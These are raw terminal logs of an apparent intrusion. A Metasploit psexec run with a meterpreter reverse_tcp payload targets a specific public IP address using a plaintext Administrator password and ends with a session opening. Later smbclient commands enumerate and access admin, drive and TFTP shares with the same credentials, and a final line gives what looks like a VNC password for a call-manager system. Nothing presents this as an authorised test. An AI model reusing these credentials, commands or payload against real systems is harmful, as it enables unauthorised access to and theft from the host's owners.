
```
msf6 > use windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set rhosts 148.217.240.11
rhosts => 148.217.240.11
msf6 exploit(windows/smb/psexec) > set smbuser Administrator
smbuser => Administrator
msf6 exploit(windows/smb/psexec) > set smbpass x1kt0r1@_u4z
smbpass => x1kt0r1@_u4z
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.1.233.4:4444
[*] 148.217.240.11:445 - Connecting to the server...
[*] 148.217.240.11:445 - Authenticating to 148.217.240.11:445 as user 'Administrator'...
[*] 148.217.240.11:445 - Selecting native target
[*] 148.217.240.11:445 - Uploading payload... MTSBhjOl.exe
[*] Sending stage (175686 bytes) to 10.1.7.9
[-] 148.217.240.11:445 - Exploit failed: RubySMB::Error::CommunicationError RubySMB::Error::CommunicationError
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/psexec) > [*] Meterpreter session 1 opened (10.1.233.4:4444 -> 10.1.7.9:3730) at 2023-07-09 15:45:40 +0000

msf6 exploit(windows/smb/psexec) >
```


```
smbclient -L 148.217.240.11 -U Administrator
Password for [WORKGROUP\Administrator]:

        Sharename       Type      Comment
        ---------       ----      -------
        E$              Disk      Default share
        IPC$            IPC       Remote IPC
        D$              Disk      Default share
        CDR             Disk
        RTMTLogs        Disk
        TFTPPath        Disk
        ADMIN$          Disk      Remote Admin
        H$              Disk
        C$              Disk      Default share
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
```


```
 smbclient \\\\148.217.240.11\\d$ -U Administrator
 smbclient \\\\148.217.240.11\\tftppath -U Administrator%x1kt0r1@_u4z

```

```
VNC CM Campus S XXI	c4llm4n4ger
```
